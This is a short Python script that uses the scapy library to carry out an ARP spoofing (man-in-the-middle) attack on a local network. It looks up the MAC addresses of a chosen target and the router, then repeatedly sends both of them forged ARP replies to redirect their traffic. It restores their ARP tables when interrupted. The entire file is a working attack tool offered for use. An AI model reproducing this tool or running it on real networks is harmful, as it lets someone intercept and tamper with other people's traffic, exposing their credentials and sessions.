#! /usr/bin/env python
# import sys
from time import sleep
import scapy.all as scapy
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target", dest="target_ip", help="Enter the IP Address of Target Machine")
    parser.add_argument("-g","--gateway", dest="gateway_ip", help="Enter the IP Address of Router")
    options = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # Construct the Ethernet frame with the destination MAC address
    ethernet = scapy.Ether(dst=target_mac)
    # Construct the ARP packet
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Combine Ethernet and ARP layers
    packet = ethernet / arp_packet
    # Send the complete packet
    scapy.sendp(packet, verbose=False)

def restore(des_ip, sou_ip):
    des_mac = get_mac(des_ip)
    sou_mac = get_mac(sou_ip)
    # Construct the Ethernet frame with the destination MAC address
    ethernet = scapy.Ether(dst=des_mac)
    # Construct the ARP packet
    arp_packet = scapy.ARP(op=2, pdst=des_ip, hwdst=des_mac, psrc=sou_ip, hwsrc=sou_mac)
    # Combine Ethernet and ARP layers
    packet = ethernet / arp_packet
    # Send the complete packet
    scapy.sendp(packet, count=4,verbose=False)

data = get_arguments()
target_ip = data.target_ip
gateway_ip = data.gateway_ip


print("Arp Spoof Started".upper())
try:
    sent_packet = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip,target_ip)
        sent_packet += 2
        print("\r[+] Packets Sent: " + str(sent_packet), end="")  # Use carriage return and suppress newline
        # sys.stdout.flush()
        sleep(2)

except KeyboardInterrupt:
    print("\n\n Reseting Arp Table....".upper())
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)
